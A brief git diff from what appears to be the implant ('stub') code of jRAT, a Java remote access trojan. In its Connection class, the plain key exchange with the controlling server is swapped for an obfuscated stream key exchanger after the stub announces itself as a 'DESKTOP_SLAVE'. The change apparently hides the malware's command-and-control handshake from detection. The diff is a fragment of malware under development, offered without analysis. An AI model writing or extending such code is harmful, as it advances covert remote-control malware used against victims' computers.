@@ -16,7 +16,8 @@ import javax.crypto.spec.SecretKeySpec;
 import se.jrat.common.ConnectionCodes;
 import se.jrat.common.crypto.Crypto;
 import se.jrat.common.crypto.CryptoUtils;
-import se.jrat.common.crypto.KeyExchanger;
+import se.jrat.common.crypto.ObfuscatedStreamKeyExchanger;
+import se.jrat.common.crypto.StreamKeyExchanger;
 import se.jrat.common.io.StringWriter;
 import se.jrat.stub.packets.incoming.AbstractIncomingPacket;
 import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
@@ -76,9 +77,8 @@ public class Connection implements Runnable {
 	        
 			outputStream.write(ConnectionCodes.DESKTOP_SLAVE);
 			
-			KeyExchanger exchanger = new KeyExchanger(dis, dos, Main.getKeyPair());
-			exchanger.readRemotePublicKey();
-			pubKey = exchanger.getRemoteKey();
+			StreamKeyExchanger exchanger = new ObfuscatedStreamKeyExchanger(Main.getKeyPair(), dis, dos);
+			pubKey = exchanger.readRemoteKey();
 			exchanger.writePublicKey();
 			
 			int keylen = dis.readInt();
